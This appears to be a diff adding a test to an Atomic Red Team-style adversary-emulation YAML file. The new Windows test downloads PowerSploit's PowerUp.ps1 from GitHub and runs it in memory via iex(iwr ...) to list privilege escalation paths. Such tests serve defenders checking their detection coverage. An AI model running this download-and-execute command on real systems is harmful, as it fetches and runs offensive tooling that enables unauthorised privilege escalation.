@@ -412,3 +412,15 @@ atomic_tests:
           "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
       foreach ($cmdlets in $malcmdlets) {
           $cmdlets}
+
+- name: PowerUp Invoke-AllChecks
+  description: |
+    Check for privilege escalation paths using PowerUp from PowerShellMafia
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
+      Invoke-AllChecks
+    name: powershell
